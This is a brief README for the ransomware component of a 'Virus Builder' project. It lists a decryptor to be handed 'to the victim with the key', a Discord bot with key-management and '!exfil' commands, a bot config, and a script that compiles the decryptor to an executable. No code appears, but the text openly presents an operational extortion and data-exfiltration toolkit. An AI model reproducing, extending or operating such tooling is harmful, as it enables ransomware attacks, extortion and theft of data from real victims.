This folder contains the tools for the **Ransomware** option of the Virus Builder.

- **BLX_Decryptor.py**: .blx decryptor (to give to the victim with the key).
- **BLX_Ransomware_Bot.py**: Discord bot (!key, !keys, !exfil, !info, !decryptor).
- **BLX_ransomware_bot_config.example.json**: example bot config (copy to `BLX_ransomware_bot_config.json`).
- **build_decryptor_exe.bat**: compiles BLX_Decryptor to EXE.

**Full documentation** (structure, options, Ransomware config, decryptor, bot, commands, dependencies): see the **main README** at the project root: **`../README.md`**.
